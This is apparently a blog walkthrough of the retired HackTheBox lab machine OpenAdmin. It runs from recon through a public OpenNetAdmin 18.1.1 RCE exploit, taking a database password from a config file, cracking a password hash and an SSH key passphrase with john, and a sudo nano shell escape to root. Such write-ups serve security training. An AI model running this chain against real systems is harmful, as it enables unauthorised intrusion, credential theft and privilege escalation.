---
title: OpenAdmin
author: Mohammad YASSINE
date: 2020-05-01 18:11:00 +0800
categories: [retired]
tags: [john,crack id_rsa,gtfobins]
---

# OpenAdmin from HackTheBox
<br/>

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/info.jpg)

<br/>
OpenAdmin was retired .It was easy and funny box with web attack and priv escalation techniques so let's start ...<br/>

## nmap scan:

```
nmap -sV -sC 10.10.10.171 -v
```

```terminal
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I can see a web port open (port 80),let's check the content,<br/>
it's a default apache web page<br/>

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/apache.jpg)

<br/>
Run gobuster to discover subfolders ...<br/>

```
gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirb/common.txt
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/01 05:26:34 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/artwork (Status: 301)
/index.html (Status: 200)
/music (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/01 05:28:24 Finished
===============================================================
```

After visiting the /music (`http://10.10.10.171/music`) and going to login page ,i found interesting thing<br/>

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/web.jpg)

i found a version: `Your version    = v18.1.1`<br/>

it's a web page , first thing i check is the source code of the page(right click --> View Page Source)<br/>

```
<head>
    <title>OpenNetAdmin :: 0wn Your Network</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="stylesheet" type="text/css" href="/ona/include/html_style_sheet.inc.php">
    <link rel="shortcut icon" type="image/ico" href="/ona/images/favicon.ico">
    <script type="text/javascript" src="/ona/include/js/global.js" language="javascript"></script>
    <script type="text/javascript" src="/ona/include/xajax_drag/drag.js"></script>
<script type="text/javascript" src="/ona/include/xajax_suggest/suggest.js"></script>
```

The title is OpenNetAdmin ,i used searchsploit maybe i can find an exploit for the version<br/>
command: `searchsploit opennetadmin`<br/>
result:

```
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                                        | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                         | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                          | exploits/php/webapps/47691.sh
```

so this version is vulnerable to `Remote Code Execution`<br/>

grab the exploit:

```
searchsploit -m exploits/php/webapps/47691.sh && chmod +x 47691.sh
```

## Getting RCE

After reviewing the code of this exploit, i see that i can run `./47691.sh http://10.10.10.171/ona/login.php` to get RCE<br/>

> **Note**: i got the `/ona` when i pressed login button ,this exploit is for the ona login page

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/rce.jpg)

## Getting ssh shell

After spending some time searching for a clue,i decided to take a look at the web root directory: `ls /var/www/html/ona/local/config/`<br/>
i found interested file called `database_settings.inc.php`,this php file contain a password: `n1nj4W4rri0R!`<br/>

```
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

now i need a valid user.In linux,you can find the usernames in `/home` or by checking the `/etc/passwd`<br/>

```
$ ls /home
jimmy
joanna
$ 
```

i have two users , `jimmy` and `joanna`.I tried to `ssh` with both users and `jimmy` works.<br/>

```
ssh jimmy@10.10.10.171
```

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/ssh.jpg)

## Owning user

I can't find user , so i need to escalate to get the user<br/>
By checking the running services using `netstat -antp` , i see some services running in local host

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/running.jpg)

to access them, i need to do a `local port forwarding` , the easiest way here is with `ssh`.<br/>

From a new terminal run:<br/>

```
ssh -L 52846:localhost:52846 jimmy@10.10.10.171
```

now i can access this service from local host ,so i run nmap in this port to find what is the exact running service<br/>

```
nmap -sV -sC 127.0.0.1 -p 52846 -v
```

```
PORT      STATE SERVICE VERSION
52846/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Tutorialspoint.com

```
it's a web service , i can visit `http://127.0.0.1:52846` 

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/login.jpg)

i need to find creds for this login page<br/>

First of all, let's check the DocumentRoot for this page, maybe i can find a login creds in some php files.<br/>
To find the web root , i need to check the apache config file<br/>

```
ls -l /etc/apache2/sites-available/
```
```
total 16
-rw-r--r-- 1 root root 6338 Jul 16  2019 default-ssl.conf
-rw-r--r-- 1 root root  303 Nov 23 17:13 internal.conf
-rw-r--r-- 1 root root 1329 Nov 22 14:24 openadmin.conf
```
the `openadmin.conf` is for the default apache web root,but in `internal.conf` i can see a new DocumentRoot<br/>

```
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
go to `/var/www/internal` and check the index.php , i got login creds<br/>
```
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
```
cracking this password with crackstation : `https://crackstation.net/` gives me `Revealed` as password <br/>
now i can login with (`jimmy:Revealed`)<br/>
a private id_rsa key appear , i can crack it with john. Save the id rsa in a file called id_rsa<br/>
download the tool: `https://github.com/stricture/hashstack-server-plugin-jtr/blob/master/scrapers/sshng2john.py`<br/>

```
/opt/sshng2john.py id_rsa > to_crack
```
```
john to_crack -w=/usr/share/wordlists/rockyou.txt
```
The password is `bloodninjas` <br/>
finnaly i can ssh to `joanna` with this id_rsa and password<br/>

```
chmod 600 id_rsa
```
```
ssh -i id_rsa joanna@10.10.10.171
```

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/user.jpg)

User owned !

## Owning root

First this to do is to check if i can run command as root without password using `sudo -l`

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
i can run `/bin/nano /opt/priv` without password <br/>
gtfobins nano: `https://gtfobins.github.io/gtfobins/nano/` <br/>
commands:<br/>
```
sudo -u root /bin/nano /opt/priv
```
press:`ctrl+R ctrl+X`<br/>
type: `reset; sh 1>&0 2>&0` and press enter<br/>

![info](https://raw.githubusercontent.com/0xyassine/0xyassine.github.io/master/assets/img/htb/open/root.jpg)

Rooted :) Your feedback is appreciated !